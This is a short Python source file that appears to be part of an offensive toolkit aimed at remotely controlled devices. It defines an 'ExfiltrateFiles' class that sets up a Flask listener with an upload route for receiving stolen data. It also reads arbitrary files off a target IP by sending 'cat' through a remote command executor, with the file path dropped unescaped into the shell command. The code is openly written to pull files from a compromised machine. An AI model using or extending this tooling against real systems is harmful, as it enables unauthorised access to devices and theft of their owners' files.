from typing import List

from flask import Flask, request

from goflex_shell.command_executor import CommandExecutor
from wrappers.base_wrapper import BaseCommand

FORM_FILE_UPLOAD = "data"
CALLBACK_HOST = '0.0.0.0'
CALLBACK_PORT = 80


class ExfiltrateFiles(BaseCommand):
    def __init__(self, ip: str):
        super().__init__(ip)

        app = Flask(__name__)

        # noinspection PyUnusedFunction
        @app.route("/upload", methods=["POST"])
        def store():
            print(request.form[FORM_FILE_UPLOAD])

        self.app = app

    def execute(self, path: str) -> bytes:
        return CommandExecutor.execute(self.ip, f'cat "{path}"')
